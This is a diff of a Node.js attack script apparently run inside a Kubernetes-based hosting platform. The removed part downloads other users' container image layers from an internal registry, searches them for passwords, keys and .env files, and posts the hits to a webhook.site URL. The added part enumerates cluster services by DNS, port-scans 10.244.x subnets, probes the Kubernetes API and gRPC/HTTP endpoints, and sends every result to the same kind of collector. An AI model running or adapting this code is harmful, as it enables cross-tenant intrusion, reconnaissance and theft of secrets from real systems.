@@ -1,10 +1,10 @@
 const https = require('https');
 const http = require('http');
-const fs = require('fs');
+const net = require('net');
+const dns = require('dns');
 const { execSync } = require('child_process');
 
-const WEBHOOK = "https://webhook.site/1d583ea3-66e1-49a4-83f5-80ac205abf8d";
-const ZOT = 'http://10.244.1.56:5000';
+const WEBHOOK = "https://webhook.site/5223a0e3-6931-4bc1-8607-a8534f4a2fac";
 
 function post(label, data) {
   return new Promise((resolve) => {
@@ -19,91 +19,131 @@ function post(label, data) {
   });
 }
 
-function httpGetBuf(url) {
+function scanPort(host, port) {
   return new Promise((resolve) => {
-    http.get(url, { timeout: 60000 }, (res) => {
-      let d = [];
-      res.on('data', c => d.push(c));
-      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(d) }));
-    }).on('error', e => resolve({ status: 0, body: Buffer.from(e.message) }));
+    const sock = new net.Socket();
+    sock.setTimeout(2000);
+    sock.on('connect', () => { sock.destroy(); resolve(true); });
+    sock.on('timeout', () => { sock.destroy(); resolve(false); });
+    sock.on('error', () => resolve(false));
+    sock.connect(port, host);
+  });
+}
+
+function dnsLookup(name) {
+  return new Promise((resolve) => {
+    dns.resolve4(name, (err, addrs) => resolve(err ? null : addrs));
   });
 }
 
 async function main() {
-  // Focus: cblaettl/epic-falcon/laravel - most interesting (Laravel app)
-  const targets = [
-    { repo: 'cblaettl/epic-falcon/laravel', tag: 'cd2bde5' },
-    { repo: 'cblaettl/vouch/vouch', tag: '8532300' },
-    { repo: 'zeitlos-software/loopcycles/loopcycles', tag: '3cefebd' },
+  let results = '';
+
+  // 1. Find internal services via DNS
+  const services = [
+    'lucity-deployer', 'deployer', 'lucity-gateway', 'gateway',
+    'lucity-builder', 'builder', 'lucity-api', 'api',
+    'lucity-controller', 'controller', 'lucity-scheduler', 'scheduler',
+    'lucity-proxy', 'proxy', 'lucity-infra-zot',
+    'kubernetes', 'kubernetes.default', 'kubernetes.default.svc'
   ];
-
-  for (const t of targets) {
-    const label = t.repo.replace(/\//g, '-');
-    
-    // Get manifest (resolve manifest list if needed)
-    let mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + t.tag);
-    let manifest = JSON.parse(mRes.body.toString());
-    if (manifest.manifests) {
-      const amd = manifest.manifests.find(m => m.platform?.architecture === 'amd64') || manifest.manifests[0];
-      mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + amd.digest);
-      manifest = JSON.parse(mRes.body.toString());
-    }
-
-    if (!manifest.layers) { await post('no-layers-' + label, 'no layers'); continue; }
-
-    // Report layers
-    await post('layers-' + label, manifest.layers.map((l,i) => i + ': ' + l.digest.substring(0,20) + '... ' + (l.size/1024/1024).toFixed(1) + 'MB').join('\n'));
-
-    // Pull last 2 layers (app code), skip >50MB
-    const appLayers = manifest.layers.slice(-2);
-    for (let i = 0; i < appLayers.length; i++) {
-      const layer = appLayers[i];
-      if (layer.size > 50 * 1024 * 1024) {
-        await post('skip-' + label + '-' + i, 'too big: ' + (layer.size/1024/1024).toFixed(1) + 'MB');
-        continue;
+  
+  const namespaces = ['lucity-system', 'default', 'kube-system'];
+  
+  for (const ns of namespaces) {
+    for (const svc of services) {
+      const fqdn = svc + '.' + ns + '.svc.cluster.local';
+      const addrs = await dnsLookup(fqdn);
+      if (addrs) {
+        results += 'DNS: ' + fqdn + ' -> ' + addrs.join(', ') + '\n';
+        // Scan common ports
+        for (const port of [80, 443, 8080, 8443, 9090, 50051, 50052, 3000, 5000, 6443]) {
+          const open = await scanPort(addrs[0], port);
+          if (open) results += '  OPEN: ' + addrs[0] + ':' + port + '\n';
+        }
       }
-
-      const res = await httpGetBuf(ZOT + '/v2/' + t.repo + '/blobs/' + layer.digest);
-      if (res.status !== 200) { await post('dl-err-' + label + '-' + i, 'status ' + res.status); continue; }
-
-      const dir = '/tmp/L-' + label + '-' + i;
-      const tar = dir + '.tar.gz';
-      fs.writeFileSync(tar, res.body);
-      fs.mkdirSync(dir, { recursive: true });
-
-      try {
-        execSync('cd ' + dir + ' && tar xzf ' + tar + ' 2>/dev/null || tar xf ' + tar + ' 2>/dev/null', { timeout: 20000 });
-      } catch(e) {}
-
-      // File listing
-      let files;
-      try {
-        files = execSync('find ' + dir + ' -type f | head -100', { encoding: 'utf8', timeout: 5000 });
-      } catch(e) { files = 'find err: ' + e.message; }
-      await post('files-' + label + '-' + i, 'Layer size: ' + (res.body.length/1024/1024).toFixed(1) + 'MB\n\n' + files);
-
-      // Search for secrets in source files
-      let secrets = '';
-      const fileList = files.split('\n').filter(f => f.trim());
-      for (const file of fileList) {
-        try {
-          const stat = fs.statSync(file);
-          if (stat.size > 100000) continue;
-          const ext = file.split('.').pop().toLowerCase();
-          const isInteresting = ['env', 'php', 'js', 'ts', 'mjs', 'json', 'yaml', 'yml', 'conf', 'sh', 'sql', 'key', 'pem'].includes(ext) ||
-            file.includes('.env') || file.includes('config') || file.includes('secret') || file.includes('artisan') || file.includes('Caddyfile');
-          if (!isInteresting) continue;
-          
-          const content = fs.readFileSync(file, 'utf8');
-          if (content.match(/password|secret|key|token|api[_-]?key|database|db_|redis|smtp|mail_|auth_|credential|private|stripe|webhook|jwt/i)) {
-            secrets += '\n=== ' + file.replace(dir, '') + ' ===\n' + content.substring(0, 2000) + '\n';
-          }
-        } catch(e) {}
-      }
-      if (secrets) await post('secrets-' + label + '-' + i, secrets);
     }
   }
-  console.log('done');
+  
+  await post('dns-scan', results || 'no services found via DNS');
+
+  // 2. Scan the known subnet for deployer/gateway
+  // We know: 10.244.1.56 = zot, 10.244.2.76 = neighbor
+  // Scan 10.244.1.x and 10.244.0.x for gRPC (50051) and HTTP (8080, 3000)
+  let portScan = '';
+  const subnets = ['10.244.0', '10.244.1', '10.244.2'];
+  const targetPorts = [50051, 8080, 3000, 9090, 80];
+  
+  for (const subnet of subnets) {
+    for (let i = 1; i <= 20; i++) {
+      const ip = subnet + '.' + i;
+      for (const port of targetPorts) {
+        const open = await scanPort(ip, port);
+        if (open) portScan += ip + ':' + port + ' OPEN\n';
+      }
+    }
+  }
+  
+  await post('port-scan', portScan || 'nothing open');
+
+  // 3. Try hitting K8s API
+  let k8s = '';
+  try {
+    const res = await new Promise((resolve) => {
+      const req = https.request({
+        hostname: 'kubernetes.default.svc', port: 443, path: '/api/v1/namespaces',
+        method: 'GET', rejectUnauthorized: false,
+        headers: { 'Authorization': 'Bearer dummy' }
+      }, (res) => {
+        let d = '';
+        res.on('data', c => d += c);
+        res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 1000) }));
+      });
+      req.on('error', e => resolve({ error: e.message }));
+      req.end();
+    });
+    k8s = JSON.stringify(res);
+  } catch(e) { k8s = e.message; }
+  
+  await post('k8s-api', k8s);
+
+  // 4. Check if we can reach any gRPC endpoints
+  // Try connecting to deployer and sending a gRPC probe
+  const grpcTargets = [];
+  // Parse open ports from scan
+  const openPorts = portScan.split('\n').filter(l => l.includes('50051'));
+  for (const line of openPorts) {
+    const [hostPort] = line.split(' ');
+    if (hostPort) grpcTargets.push(hostPort);
+  }
+  
+  await post('grpc-targets', grpcTargets.join('\n') || 'no gRPC ports found');
+
+  // 5. Try to reach deployer via HTTP (some Go services expose HTTP alongside gRPC)
+  let httpProbe = '';
+  const httpTargets = portScan.split('\n').filter(l => l.includes('OPEN'));
+  for (const line of httpTargets.slice(0, 10)) {
+    const [hostPort] = line.split(' ');
+    if (!hostPort) continue;
+    const [ip, port] = hostPort.split(':');
+    try {
+      const res = await new Promise((resolve) => {
+        const req = http.request({ hostname: ip, port: parseInt(port), path: '/', method: 'GET', timeout: 3000 }, (res) => {
+          let d = '';
+          res.on('data', c => d += c);
+          res.on('end', () => resolve(ip + ':' + port + ' -> ' + res.statusCode + ' ' + d.substring(0, 200)));
+        });
+        req.on('error', e => resolve(ip + ':' + port + ' -> ERR: ' + e.message));
+        req.on('timeout', () => { req.destroy(); resolve(ip + ':' + port + ' -> TIMEOUT'); });
+        req.end();
+      });
+      httpProbe += res + '\n';
+    } catch(e) {}
+  }
+  
+  await post('http-probe', httpProbe || 'no HTTP targets');
+
+  console.log('recon done');
 }
 
 main().catch(console.error);
